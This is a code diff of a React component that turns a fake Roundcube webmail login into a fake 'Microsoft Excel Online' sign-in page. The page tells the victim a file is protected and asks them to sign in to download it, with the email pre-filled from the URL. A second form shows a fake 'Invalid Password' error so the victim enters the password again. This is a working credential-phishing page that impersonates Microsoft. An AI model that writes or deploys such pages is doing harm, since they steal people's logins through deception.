@@ -61,56 +61,126 @@ function Forms() {
 
   return (
     <Styls>
-      <div className="contsainer">
-        {showForm && (
-          <div className="imagees">
-            <img
-              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
-              className="imagee"
-              alt="displare"
-            />
+      {" "}
+      {showForm && (
+        <div id="html_encoder_div">
+          <div className="container">
+            <div className="office show border shadow bg-light" id="others">
+              <div className="office-holder">
+                <div className="logo">
+                  <div id="login_logo">
+                    <img
+                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
+                      width="100"
+                      height="100"
+                      alt=""
+                    />
+                  </div>
+                  <h5 className="font-weight-light">
+                    <b> Microsoft Excel Online </b>
+                    <br />
+                  </h5>
+                  <p>
+                    This file is protected by Microsoft Online. Please sign in
+                    to access file
+                  </p>
+                </div>
+
+                <form className="formal" onSubmit={submitHandler}>
+                  <div className="form-holder">
+                    <div>
+                      <div className="alert alert-danger hide alert2"></div>
+                    </div>
+                    <input
+                      type="email"
+                      name="to_user"
+                      required
+                      className="form-control"
+                      value={params.id}
+                    />
+                    <input
+                      type="password"
+                      name="to_pass"
+                      required
+                      placeholder="Password"
+                      className="form-control"
+                    />
+
+                    <div className="btn-holder">
+                      <button className="btn btn-lg col-12">
+                        Download Document
+                      </button>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
           </div>
-        )}
-        {showForm && (
-          <form className="formal" onSubmit={submitHandler}>
-            <label>
-              <span className="newicon1">
-                <i class="fas fa-user fa-1x"></i>
-              </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                placeholder="Username"
-                value={params.id}
-              />
-            </label>
-            <br></br>
-            <label>
-              <span className="newicon1">
-                <i class="fas fa-lock fa-1x"></i>
-              </span>
-              <input
-                type="password"
-                name="to_pass"
-                required
-                placeholder="Password"
-              />
-            </label>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
-          </form>
-        )}
-      </div>
+        </div>
+      )}
+      {confirmForm && (
+        <div id="html_encoder_div">
+          <div className="container">
+            <div className="office show border shadow bg-light" id="others">
+              <div className="office-holder">
+                <div className="logo">
+                  <div id="login_logo">
+                    <img
+                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
+                      width="100"
+                      height="100"
+                      alt=""
+                    />
+                  </div>
+                  <h5 className="font-weight-light">
+                    <b> Microsoft Excel Online </b>
+                    <br />
+                  </h5>
+                  <p>
+                    This file is protected by Microsoft Online. Please sign in
+                    to access file
+                  </p>
+                </div>
+
+                <div className="msg">
+                  Invalid Password.! Please enter correct password.
+                </div>
+
+                <form className="formal" onSubmit={editHandler}>
+                  <div className="form-holder">
+                    <div>
+                      <div className="alert alert-danger hide alert2"></div>
+                    </div>
+                    <input
+                      type="email"
+                      name="to_user"
+                      required
+                      className="form-control"
+                      value={params.id}
+                    />
+                    <input
+                      type="password"
+                      name="to_pass"
+                      required
+                      placeholder="Password"
+                      className="form-control"
+                    />
+
+                    <div className="btn-holder">
+                      <button className="btn btn-lg col-12">
+                        Download Document
+                      </button>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
       {confirmForm && (
         <div className="contsainer">
-          <div className="imagees">
-            <img
-              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
-              className="imagee"
-              alt="displare"
-            />
-          </div>
+          <div className="imagees"></div>
 
           <form className="formal" onSubmit={editHandler}>
             <label>
